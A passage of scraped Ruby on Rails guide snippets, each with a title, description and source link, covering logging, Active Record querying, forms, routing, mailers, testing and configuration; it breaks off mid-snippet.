https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nlogger = ActiveSupport::TaggedLogging.new(Logger.new(STDOUT))\nlogger.tagged(\"BCX\") { logger.info \"Stuff\" }                            # Logs \"[BCX] Stuff\"\nlogger.tagged(\"BCX\", \"Jason\") { logger.info \"Stuff\" }                   # Logs \"[BCX] [Jason] Stuff\"\nlogger.tagged(\"BCX\") { logger.tagged(\"Jason\") { logger.info \"Stuff\" } } # Logs \"[BCX] [Jason] Stuff\"\n```\n\n----------------------------------------\n\nTITLE: SQL Query after Reversing Order without Initial Order Clause (SQL)\nDESCRIPTION: This SQL query shows the result of the `reverse_order` method when no initial ordering clause is provided.  The results are ordered by `books.id` in descending order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_120\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM books WHERE author_id > 10 ORDER BY books.id DESC\n```\n\n----------------------------------------\n\nTITLE: Writing a Unit Test for String Extension - MiniTest - Ruby\nDESCRIPTION: Defines a test case using ActiveSupport::TestCase, asserting that the new 'to_squawk' method on String works as expected. Relies on the MiniTest and ActiveSupport test libraries as well as 'test_helper'. Inputs are String instances; the expected output is the string prefixed with 'squawk!'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\n# yaffle/test/core_ext_test.rb\n\nrequire \"test_helper\"\n\nclass CoreExtTest < ActiveSupport::TestCase\n  def test_to_squawk_prepends_the_word_squawk\n    assert_equal \"squawk! Hello World\", \"Hello World\".to_squawk\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Indexing Enumerable with index_by in Ruby\nDESCRIPTION: This snippet illustrates the `index_by` method added to the Enumerable class. It creates a hash with elements indexed by keys returned by a block passed to each element. Defined in `active_support/core_ext/enumerable.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_110\n\nLANGUAGE: ruby\nCODE:\n```\ninvoices.index_by(&:number)\n# => {\"2009-032\" => <Invoice ...>, \"2009-008\" => <Invoice ...>, ...}\n```\n\n----------------------------------------\n\nTITLE: Configuring Log Levels in Rails\nDESCRIPTION: Shows how to change the default log level in Rails using either configuration options or by directly setting the logger level. This helps control the verbosity of logs in different environments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.log_level = :warn # In any environment initializer, or\nRails.logger.level = 0 # at any time\n```\n\n----------------------------------------\n\nTITLE: Configuring In Stock Mailer (Rails)\nDESCRIPTION: This code snippet defines the `in_stock` method within the `ProductMailer` class. It sets the `@product` instance variable and sends an email to the subscriber's email address.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_107\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductMailer < ApplicationMailer\n  # Subject can be set in your I18n file at config/locales/en.yml\n  # with the following lookup:\n  #\n  #   en.product_mailer.in_stock.subject\n  #\n  def in_stock\n    @product = params[:product]\n    mail to: params[:subscriber].email\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Test Method Example (Ruby)\nDESCRIPTION: This code snippet demonstrates how to define a test using the `test` macro provided by Rails. It takes a test name and a block of code to execute as the test. This macro simplifies test definition and improves readability.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_5\n\nLANGUAGE: Ruby\nCODE:\n```\ntest \"the truth\" do\n  assert true\nend\n```\n\n----------------------------------------\n\nTITLE: Using form_with in Rails Views\nDESCRIPTION: Examples of the new form_with helper that unifies form_for and form_tag functionality, showing various ways to generate forms using URLs, scopes, and models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_1_release_notes.md#2025-04-23_snippet_2\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with url: posts_path do |form| %>\n  <%= form.text_field :title %>\n<% end %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with scope: :post, url: posts_path do |form| %>\n  <%= form.text_field :title %>\n<% end %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: Post.new do |form| %>\n  <%= form.text_field :title %>\n<% end %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: Post.first do |form| %>\n  <%= form.text_field :title %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Using ActiveRecord::Base.normalizes for Attribute Normalization\nDESCRIPTION: Example of how to implement attribute normalization using the new normalizes method in ActiveRecord, which standardizes values before persisting to the database and during queries.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ActiveRecord::Base\n  normalizes :email, with: -> email { email.strip.downcase }\n  normalizes :phone, with: -> phone { phone.delete(\"^0-9\").delete_prefix(\"1\") }\nend\n\nuser = User.create(email: \" CRUISE-CONTROL@EXAMPLE.COM\\n\")\nuser.email                  # => \"cruise-control@example.com\"\n\nuser = User.find_by(email: \"\\tCRUISE-CONTROL@EXAMPLE.COM \")\nuser.email                  # => \"cruise-control@example.com\"\nuser.email_before_type_cast # => \"cruise-control@example.com\"\n\nUser.where(email: \"\\tCRUISE-CONTROL@EXAMPLE.COM \").count         # => 1\nUser.where([\"email = ?\", \"\\tCRUISE-CONTROL@EXAMPLE.COM \"]).count # => 0\n\nUser.exists?(email: \"\\tCRUISE-CONTROL@EXAMPLE.COM \")         # => true\nUser.exists?([\"email = ?\", \"\\tCRUISE-CONTROL@EXAMPLE.COM \"]) # => false\n\nUser.normalize_value_for(:phone, \"+1 (555) 867-5309\") # => \"5558675309\"\n```\n\n----------------------------------------\n\nTITLE: Querying with ids in Rails\nDESCRIPTION: Demonstrates how to use `ids` to retrieve all the IDs for a relation using the table's primary key.  Shows how to handle cases where the primary key is explicitly defined.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_200\n\nLANGUAGE: irb\nCODE:\n```\nirb> Customer.ids\nSELECT id FROM customers\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass Customer < ApplicationRecord\n  self.primary_key = \"customer_id\"\nend\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> Customer.ids\nSELECT customer_id FROM customers\n```\n\n----------------------------------------\n\nTITLE: Running EXPLAIN with Options (PostgreSQL)\nDESCRIPTION: This snippet shows how to use options with the `explain` command in Rails, specifically for PostgreSQL. It uses the `:analyze` and `:verbose` options to get a more detailed query plan, including actual execution times and verbose output.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_215\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where(id: 1).joins(:orders).explain(:analyze, :verbose)\n```\n\n----------------------------------------\n\nTITLE: Complete Blorgh::Article Model Definition (Ruby)\nDESCRIPTION: Shows the complete `Blorgh::Article` model class after adding the `has_many :comments` association. It demonstrates the namespacing within the `Blorgh` module.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Blorgh\n  class Article < ApplicationRecord\n    has_many :comments\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using `present?` for Checking Existence\nDESCRIPTION: This snippet uses the `present?` method, which is the opposite of `blank?`, to check if a value is present before setting conditional cache control.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\ndef set_conditional_cache_control!\n  unless self[\"Cache-Control\"].present?\n    # ...\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Default Security Headers in Ruby on Rails\nDESCRIPTION: This snippet shows the default configuration for security headers in Rails. It includes settings for X-Frame-Options, X-XSS-Protection, X-Content-Type-Options, X-Permitted-Cross-Domain-Policies, and Referrer-Policy.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_64\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_dispatch.default_headers = {\n  \"X-Frame-Options\" => \"SAMEORIGIN\",\n  \"X-XSS-Protection\" => \"0\",\n  \"X-Content-Type-Options\" => \"nosniff\",\n  \"X-Permitted-Cross-Domain-Policies\" => \"none\",\n  \"Referrer-Policy\" => \"strict-origin-when-cross-origin\"\n}\n```\n\n----------------------------------------\n\nTITLE: Using Routing Concerns in Namespaces\nDESCRIPTION: This snippet shows how to use routing concerns within a `namespace`.  It includes the `:commentable` concern in the `messages` namespace and both `:commentable` and `:image_attachable` concerns in the `articles` namespace. This is similar to including concerns in resources directly but applies the concerns within the specified namespaces.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nnamespace :messages do\n  concerns :commentable\nend\n\nnamespace :articles do\n  concerns :commentable\n  concerns :image_attachable\nend\n```\n\n----------------------------------------\n\nTITLE: Form with Composite Primary Key Model\nDESCRIPTION: This snippet demonstrates how to create a form for a model object with a composite primary key using form_with in Rails. Only the title is shown in this snippet.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_19\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: @book do |form| %>\n  <%= form.text_field :title %>\n  <%= form.submit %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Storing Mailgun Signing Key in Credentials\nDESCRIPTION: This YAML code shows how to store the Mailgun signing key in the Rails encrypted credentials file.  This is read by Action Mailbox.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_11\n\nLANGUAGE: YAML\nCODE:\n```\naction_mailbox:\n  mailgun_signing_key: ...\n```\n\n----------------------------------------\n\nTITLE: Parametric Scope Definition in Rails\nDESCRIPTION: Defines a parametric scope with an `account_id` parameter and constraints. This creates routes prefixed with the account ID and allows accessing the `account_id` in controllers, helpers, and views via `params[:account_id]`. It also generates path and URL helpers prefixed with `account_`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_72\n\nLANGUAGE: ruby\nCODE:\n```\nscope \":account_id\", as: \"account\", constraints: { account_id: /\\d+/ } do\n  resources :articles\nend\n```\n\n----------------------------------------\n\nTITLE: Removing Link Tags with strip_links Helper in Ruby\nDESCRIPTION: Demonstrates the `strip_links` helper from Action View's SanitizeHelper. It removes all HTML `<a>` tags from a given text, leaving only the link text content.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\nstrip_links(\"<a href='https://rubyonrails.org'>Ruby on Rails</a>\")\n# => Ruby on Rails\n```\n\nLANGUAGE: ruby\nCODE:\n```\nstrip_links(\"emails to <a href='mailto:me@email.com'>me@email.com</a>.\")\n# => emails to me@email.com.\n```\n\nLANGUAGE: ruby\nCODE:\n```\nstrip_links(\"Blog: <a href='http://myblog.com/'>Visit</a>.\")\n# => Blog: Visit.\n```\n\n----------------------------------------\n\nTITLE: Using Create and Update Callbacks\nDESCRIPTION: Illustrates the output when using the combined create and update callbacks. The logs show the events triggered when creating a new user and then updating their email.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_16\n\nLANGUAGE: irb\nCODE:\n```\nirb> user = User.create(name: \"John Doe\", email: \"john.doe@example.com\")\nConfirmation email sent to: john.doe@example.com\n=> #<User id: 1, email: \"john.doe@example.com\", ...>\n\nirb> user.update(email: \"john.doe.new@example.com\")\nNotification sent to admin about critical info update for: john.doe.new@example.com\n=> true\n```\n\n----------------------------------------\n\nTITLE: Initializing Rails Server Start Method\nDESCRIPTION: The Rails::Server#start method which creates temporary directories, sets up development caching, configures logging, and handles INT signal trapping for graceful shutdown.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Rails\n  class Server < ::Rackup::Server\n    def start(after_stop_callback = nil)\n      trap(:INT) { exit }\n      create_tmp_directories\n      setup_dev_caching\n      log_to_stdout if options[:log_stdout]\n\n      super()\n      # ...\n    end\n\n    private\n      def setup_dev_caching\n        if options[:environment] == \"development\"\n          Rails::DevCaching.enable_by_argument(options[:caching])\n        end\n      end\n\n      def create_tmp_directories\n        %w(cache pids sockets).each do |dir_to_make|\n          FileUtils.mkdir_p(File.join(Rails.root, \"tmp\", dir_to_make))\n        end\n      end\n\n      def log_to_stdout\n        wrapped_app # touch the app so the logger is set up\n\n        console = ActiveSupport::Logger.new(STDOUT)\n        console.formatter = Rails.logger.formatter\n        console.level = Rails.logger.level\n\n        unless ActiveSupport::Logger.logger_outputs_to?(Rails.logger, STDERR, STDOUT)\n          Rails.logger.broadcast_to(console)\n        end\n      end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: HTML Output of Collection Select\nDESCRIPTION: This is the HTML output produced by the `collection_select` helper. It shows a select box with options for Berlin, Chicago, and Madrid, populated from the City model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_53\n\nLANGUAGE: html\nCODE:\n```\n<select name=\"person[city_id]\" id=\"person_city_id\">\n  <option value=\"1\">Berlin</option>\n  <option value=\"3\">Chicago</option>\n  <option value=\"2\">Madrid</option>\n</select>\n```\n\n----------------------------------------\n\nTITLE: Executing Rails Generator Commands via CLI (Ruby on Rails, Bash)\nDESCRIPTION: These command-line snippets demonstrate how to invoke the\\n Rails generator utility to list available generators, obtain help for specific generators, generate a new controller, scaffold a resource with model and views, run database migrations, and start the Rails development server. These commands are intended to be run in the terminal from the root of a Rails application. They require Rails and its dependencies to be installed. Outputs will typically include newly created files and changes to the project structure.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate\\nUsage:\\n  bin/rails generate GENERATOR [args] [options]\\n\\n...\\n...\\n\\nPlease choose a generator below.\\n\\nRails:\\n  assets\\n  channel\\n  controller\\n  generator\\n  ...\\n  ...\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate controller\\nUsage:\\n  bin/rails generate controller NAME [action action] [options]\\n\\n...\\n...\\n\\nDescription:\\n    ...\\n\\n    To create a controller within a module, specify the controller name as a path like 'parent_module/controller_name'.\\n\\n    ...\\n\\nExample:\\n    `bin/rails generate controller CreditCards open debit credit close`\\n\\n    Credit card controller with URLs like /credit_cards/debit.\\n        Controller: app/controllers/credit_cards_controller.rb\\n        Test:       test/controllers/credit_cards_controller_test.rb\\n        Views:      app/views/credit_cards/debit.html.erb [...]\\n        Helper:     app/helpers/credit_cards_helper.rb\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate controller Greetings hello\\n     create  app/controllers/greetings_controller.rb\\n      route  get 'greetings/hello'\\n     invoke  erb\\n     create    app/views/greetings\\n     create    app/views/greetings/hello.html.erb\\n     invoke  test_unit\\n     create    test/controllers/greetings_controller_test.rb\\n     invoke  helper\\n     create    app/helpers/greetings_helper.rb\\n     invoke    test_unit\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate model\\nUsage:\\n  bin/rails generate model NAME [field[:type][:index] field[:type][:index]] [options]\\n\\n...\\n\\nActiveRecord options:\\n      [--migration], [--no-migration]        # Indicates when to generate migration\\n                                             # Default: true\\n\\n...\\n\\nDescription:\\n    Generates a new model. Pass the model name, either CamelCased or\\n    under_scored, and an optional list of attribute pairs as arguments.\\n\\n...\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate scaffold HighScore game:string score:integer\\n    invoke  active_record\\n    create    db/migrate/20190416145729_create_high_scores.rb\\n    create    app/models/high_score.rb\\n    invoke    test_unit\\n    create      test/models/high_score_test.rb\\n    create      test/fixtures/high_scores.yml\\n    invoke  resource_route\\n     route    resources :high_scores\\n    invoke  scaffold_controller\\n    create    app/controllers/high_scores_controller.rb\\n    invoke    erb\\n    create      app/views/high_scores\\n    create      app/views/high_scores/index.html.erb\\n    create      app/views/high_scores/edit.html.erb\\n    create      app/views/high_scores/show.html.erb\\n    create      app/views/high_scores/new.html.erb\\n    create      app/views/high_scores/_form.html.erb\\n    invoke    test_unit\\n    create      test/controllers/high_scores_controller_test.rb\\n    create      test/system/high_scores_test.rb\\n    invoke    helper\\n    create      app/helpers/high_scores_helper.rb\\n    invoke      test_unit\\n    invoke    jbuilder\\n    create      app/views/high_scores/index.json.jbuilder\\n    create      app/views/high_scores/show.json.jbuilder\\n    create      app/views/high_scores/_high_score.json.jbuilder\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate\\n==  CreateHighScores: migrating ===============================================\\n-- create_table(:high_scores)\\n   -> 0.0017s\\n==  CreateHighScores: migrated (0.0019s) ======================================\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails server\\n=> Booting Puma...\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails console -e staging\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails console --sandbox\\nLoading development environment in sandbox (Rails 8.1.0)\\nAny modifications you make will be rolled back on exit\\nirb(main):001:0>\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails dbconsole --database=animals\n```\n\n----------------------------------------\n\nTITLE: Query Books by Title Using String Conditions in Ruby\nDESCRIPTION: This snippet demonstrates how to use a string condition with the `where` method to find books with a specific title.  However, it is noted that this approach is vulnerable to SQL injection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_53\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(\"title = 'Introduction to Algorithms'\")\n```\n\n----------------------------------------\n\nTITLE: Validating Attribute Exclusion from a Static Set in Rails (Ruby)\nDESCRIPTION: Uses the `exclusion` validator in an `Account` model to ensure the `subdomain` attribute's value is *not* among the reserved values specified in the array `['www', 'us', 'ca', 'jp']`. The `:in` option defines the set of disallowed values, and a custom message is provided.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\nclass Account < ApplicationRecord\n  validates :subdomain, exclusion: { in: %w(www us ca jp),\n    message: \"%\\{value} is reserved.\" }\nend\n```\n\n----------------------------------------\n\nTITLE: Updating a User with ActiveRecord Callbacks\nDESCRIPTION: Illustrates the output when updating a user with the defined update callbacks. The logs show the sequence of events triggered by the before_update, around_update, and after_update callbacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_14\n\nLANGUAGE: irb\nCODE:\n```\nirb> user = User.find(1)\n=> #<User id: 1, email: \"john.doe@example.com\", created_at: \"2024-03-20 16:19:52.405195000 +0000\", updated_at: \"2024-03-20 16:19:52.405195000 +0000\", name: \"John Doe\", role: \"user\" >\n\nirb> user.update(role: \"admin\")\nUser role changed to admin\nUpdating user with email: john.doe@example.com\nUser updated with email: john.doe@example.com\nUpdate email sent to: john.doe@example.com\n```\n\n----------------------------------------\n\nTITLE: Adding a Development Plugin to Gemfile in Ruby on Rails\nDESCRIPTION: This code snippet shows how to add a plugin in development to a Rails application's Gemfile using a Git repository.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\ngem \"yaffle\", git: \"https://github.com/rails/yaffle.git\"\n```\n\n----------------------------------------\n\nTITLE: Converting Strings to Date, Time, and Datetime in Ruby\nDESCRIPTION: This snippet demonstrates the `to_date`, `to_time`, and `to_datetime` methods to convert strings into Date, Time, and DateTime objects, respectively.  These methods are convenience wrappers around `Date._parse` and are part of ActiveSupport core extensions to the String class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_92\n\nLANGUAGE: ruby\nCODE:\n```\n\"2010-07-27\".to_date              # => Tue, 27 Jul 2010\n\"2010-07-27 23:37:00\".to_time     # => 2010-07-27 23:37:00 +0200\n\"2010-07-27 23:37:00\".to_datetime # => Tue, 27 Jul 2010 23:37:00 +0000\n```\n\n----------------------------------------\n\nTITLE: Rendering a Partial with a Layout\nDESCRIPTION: This code snippet shows how to render a partial with a specific layout using the `:partial` and `:layout` options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_75\n\nLANGUAGE: erb\nCODE:\n```\n<%= render partial: \"link_area\", layout: \"graybar\" %>\n```\n\n----------------------------------------\n\nTITLE: AND Condition with Relations in Rails\nDESCRIPTION: Demonstrates using the `and` method to build an `AND` condition for the logical intersection between relations. It finds customers whose ID is in both [1, 2] and [2, 3], effectively finding customers with ID 2.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_77\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where(id: [1, 2]).and(Customer.where(id: [2, 3]))\n```\n\n----------------------------------------\n\nTITLE: Using Replica Connection in Specific Shard - ActiveRecord - Ruby\nDESCRIPTION: This snippet demonstrates manual connection switching to use the replica database of a specified shard for all queries within the block. It targets sharding setups where 'Person.first' reads from the read replica on 'shard_one'. All dependencies and APIs are as described for previous sharding examples.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\nShardRecord.connected_to(role: :reading, shard: :shard_one) do\n  Person.first # Lookup record from read replica of shard one.\nend\n```\n\n----------------------------------------\n\nTITLE: Controller Params After JSON Request - Ruby\nDESCRIPTION: Shows the Ruby hash params as received in the controller after a JSON request from the client. Illustrates that parameters will be properly parsed and nested, assuming the client sends correct Content-Type.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\n{ person: { firstName: \"Yehuda\", lastName: \"Katz\" } }\n```\n\n----------------------------------------\n\nTITLE: Specify Custom Action Cable URL JavaScript\nDESCRIPTION: This JavaScript code demonstrates how to specify a different URL for the Action Cable consumer to connect to.  It shows examples of using a static string, a URL with websockets over HTTP, and a function to dynamically generate the URL, including a token for authentication.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Specify a different URL to connect to\ncreateConsumer('wss://example.com/cable')\n// Or when using websockets over HTTP\ncreateConsumer('https://ws.example.com/cable')\n\n// Use a function to dynamically generate the URL\ncreateConsumer(getWebSocketURL)\n\nfunction getWebSocketURL() {\n  const token = localStorage.get('auth-token')\n  return `wss://example.com/cable?token=${token}`\n}\n```\n\n----------------------------------------\n\nTITLE: Changing System Test Driver to Cuprite (Ruby)\nDESCRIPTION: This code snippet demonstrates how to change the default system test driver from Selenium to Cuprite in Rails. It requires the `test_helper` and `capybara/cuprite` and then uses `driven_by :cuprite` within the `ApplicationSystemTestCase` class to configure the test driver.  Requires the cuprite gem.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_60\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\nrequire \"capybara/cuprite\"\n\nclass ApplicationSystemTestCase < ActionDispatch::SystemTestCase\n  driven_by :cuprite\nend\n```\n\n----------------------------------------\n\nTITLE: Passing Local Variables to Partial (edit.html.erb)\nDESCRIPTION: This code snippet shows how to pass a local variable named `zone` with the value of `@zone` to the `_form` partial when rendering the `edit` view. This allows the partial to access the `zone` object within its scope.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_77\n\nLANGUAGE: html+erb\nCODE:\n```\n<h1>Editing zone</h1>\n<%= render partial: \"form\", locals: {zone: @zone} %>\n```\n\n----------------------------------------\n\nTITLE: System Test: Testing Email Delivery (Ruby)\nDESCRIPTION: This system test checks if an email is delivered when inviting a friend via the user interface. It visits the `invite_users_url`, fills in the email field, and clicks the 'Invite' button. `assert_emails` verifies that one email is delivered.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_101\n\nLANGUAGE: ruby\nCODE:\n```\n# System Test\nrequire \"test_helper\"\n\nclass UsersTest < ActionDispatch::SystemTestCase\n  driven_by :selenium, using: :headless_chrome\n\n  test \"inviting a friend\" do\n    visit invite_users_url\n    fill_in \"Email\", with: \"friend@example.com\"\n    assert_emails 1 do\n      click_on \"Invite\"\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Building Associated Objects in Rails\nDESCRIPTION: Demonstrates building new associated objects using collection.build method without saving to database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\n@book = @author.books.build(published_at: Time.now,\n                            book_number: \"A12345\")\n\n@books = @author.books.build([\n  { published_at: Time.now, book_number: \"A12346\" },\n  { published_at: Time.now, book_number: \"A12347\" }\n])\n```\n\n----------------------------------------\n\nTITLE: Linking to Product Show Page with Helper (ERB)\nDESCRIPTION: This ERB snippet demonstrates using the `link_to` helper and `product_path` to generate a link to the product's show page within the `index.html.erb` view. This uses Rails' routing helpers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_51\n\nLANGUAGE: erb\nCODE:\n```\n<h1>Products</h1>\n\n<div id=\"products\">\n  <% @products.each do |product| %>\n    <div>\n      <%= link_to product.name, product_path(product.id) %>\n    </div>\n  <% end %>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Creating a Join Table with a Custom Table Name\nDESCRIPTION: This snippet shows how to create a join table with a custom name using the `:table_name` option. The table created will be named `categorization` instead of the default `categories_products`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\ncreate_join_table :products, :categories, table_name: :categorization\n```\n\n----------------------------------------\n\nTITLE: SQL Equivalent of Active Record Destroy Operation\nDESCRIPTION: Shows the generated SQL `DELETE` statement corresponding to the `book.destroy` call. It removes the specific book record from the 'books' table identified by its 'id', using a parameterized query.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_17\n\nLANGUAGE: sql\nCODE:\n```\nDELETE FROM \"books\" WHERE \"books\".\"id\" = ?  [[\"id\", 104]]\n```\n\n----------------------------------------\n\nTITLE: Form with button method overrides in ERB\nDESCRIPTION: This ERB code demonstrates how to override the form method using the `formmethod` attribute on buttons, allowing for DELETE requests within a PATCH form. Rails emulates these methods via POST with a hidden `_method` input and a `name=\"_method\" value=\"delete\"` attribute on the delete button.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_29\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with url: \"/posts/1\", method: :patch do |form| %>\n  <%= form.button \"Delete\", formmethod: :delete, data: { confirm: \"Are you sure?\" } %>\n  <%= form.button \"Update\" %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Overriding Engine Model Using class_eval\nDESCRIPTION: Shows how to override an engine model using class_eval to reopen the existing class safely.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_57\n\nLANGUAGE: ruby\nCODE:\n```\n# MyApp/app/overrides/models/blorgh/article_override.rb\nBlorgh::Article.class_eval do\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Generated Columns in PostgreSQL\nDESCRIPTION: Demonstrates how to use generated columns in PostgreSQL with Rails models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20131220144913_create_users.rb\ncreate_table :users do |t|\n  t.string :name\n  t.virtual :name_upcased, type: :string, as: \"upper(name)\", stored: true\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/user.rb\nclass User < ApplicationRecord\nend\n```\n\n----------------------------------------\n\nTITLE: Disabling Connection Pooling for Cache Stores in Rails 7.1\nDESCRIPTION: Configuration example showing how to disable the new default connection pooling behavior for MemCacheStore and RedisCacheStore in Rails 7.1. Connection pooling is now enabled by default but can be disabled with the pool: false option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.cache_store = :mem_cache_store, \"cache.example.com\", { pool: false }\n```\n\n----------------------------------------\n\nTITLE: Checking if Model Attribute is Encrypted - Ruby\nDESCRIPTION: Checks whether a specific attribute in a model is encrypted using Active Record Encryption. The method accepts the attribute name as a symbol and returns a boolean indicating encryption status. Requires the model to be properly configured for attribute encryption.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\narticle.encrypted_attribute?(:title)\n```\n\n----------------------------------------\n\nTITLE: Using the Association Owner in Scope Definition\nDESCRIPTION: Shows how to pass the owner of the association as an argument to the scope block for more control, creating a dynamic scope based on the supplier's active status. Notes that this approach makes preloading impossible.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_135\n\nLANGUAGE: ruby\nCODE:\n```\nclass Supplier < ApplicationRecord\n  has_one :account, ->(supplier) { where active: supplier.active? }\nend\n```\n\n----------------------------------------\n\nTITLE: Rails PATCH Request with Parameters Ruby\nDESCRIPTION: Shows how to perform a PATCH request to update a resource, including passing parameters and marking the request as an AJAX call. The example updates the 'title' attribute of an article.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\npatch article_url(Article.last), params: { article: { title: 